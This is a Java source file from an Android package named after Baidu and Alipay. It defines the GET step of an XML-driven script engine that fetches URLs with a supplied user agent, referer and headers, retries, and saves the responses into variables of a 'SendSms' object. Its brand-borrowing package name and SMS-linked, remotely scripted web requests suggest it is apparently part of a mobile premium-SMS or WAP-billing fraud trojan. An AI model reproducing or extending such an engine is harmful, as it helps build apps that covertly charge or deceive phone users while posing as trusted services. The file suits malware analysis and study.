package com.baidu.alipay.script;

import java.util.List;

import android.content.Context;

import com.baidu.alipay.LogUtil;
import com.baidu.alipay.net.HttpConnect;

public class Get extends Tags {
    private static final String TAG = "Get";
    
    public static final String PROP_URL = "url";
    public static final String PROP_BACK = "back";
    public static final String PROP_LENGTH = "length";
    public static final String PROP_ISDOMAIN = "isDomain";
    public static final String PROP_PROXY = "proxy";
    
    private String url;
    private String back;
    private int length;
    private String proxy;
    private boolean isDomain = true;
    private static int maxTryTimes = 3;

    public Get(String xml,boolean dynamic) {
        this.url = getNodeValue(xml, PROP_URL);
        this.back = getNodeValue(xml, PROP_BACK);
        this.length = formatLength(getNodeValue(xml, PROP_LENGTH));
        this.setHeader = getNodeValue(xml, PROP_SETHEADER);
        this.proxy = getNodeValue(xml, PROP_PROXY);
        this.proxy = (this.proxy == "" ? "1" : "0");
        
        String isDomainStr = getNodeValue(xml, PROP_ISDOMAIN);
        if(isDomainStr != null && isDomainStr.length() > 0){
        	isDomain = Boolean.parseBoolean(isDomainStr);
        }
        
        this.dynamic = dynamic;
    }

    public String work(Context context, SendSms sendSms, List<Tags> tagsList, int pos) {
        String Url_ = formatUrl(sendSms,url);
        String SetHeader_ = null;
        if (setHeader != null) {
            SetHeader_ = fomartData(sendSms,setHeader);
        }
        
        int tryTimes = 0;
        
        while(tryTimes < maxTryTimes && rStr == null){
        	try { 
        		if(tryTimes > 0){
        			Thread.sleep(1000 * 2);
        		}
        		
            	HttpConnect conn = new HttpConnect(context);
            	conn.isProxy = (proxy == "1");
//            	LogUtil.e(TAG, "get 方法第"+tryTimes+"次访问" + Url_);
//                
//            	LogUtil.e(TAG, "UA~~~" + sendSms.getUa() + "");
                
            	byte[] BackStream = conn.request(sendSms,Url_, "GET", referer, sendSms.getUa(), null,
                        SetHeader_, length, isDomain);
                
            	if (BackStream == null) {
                    LogUtil.e(TAG, "GET方法400错误: " + back + "");
                    errorReason = "G_400_" + back;
                }else{
                	
                	rStr = "0";
                	
                	if (back != null && !back.equals("")) {
                		rStr = com.baidu.alipay.Tools.byteToUTF8String(BackStream);
                		LogUtil.e(TAG,"GET的结果" + rStr);
//                		rStr = "Get：" + Url_ + "\r\n" + rStr;
                        sendSms.setDataValue(back, rStr);
                    }
                }
                
                conn = null;
                BackStream = null;
                
                System.gc();
            } catch (Exception ex) {
                ex.printStackTrace();
//                LogUtil.e(TAG, "get出错" + "返回" + "G_" + back + "_f");
                
                errorReason = "G_" + back + "_f";
            }
        	
        	tryTimes ++;
        }
        
        if(rStr == null){
        	return TAGS_EXEC_FAIL;
        }else{
        	rStr = null;
        	errorReason = "";
        	return TAGS_EXEC_SUCC;
        }
    }

	@Override
	public String getTag() {
		return Tags.TAGS_GET;
	}
}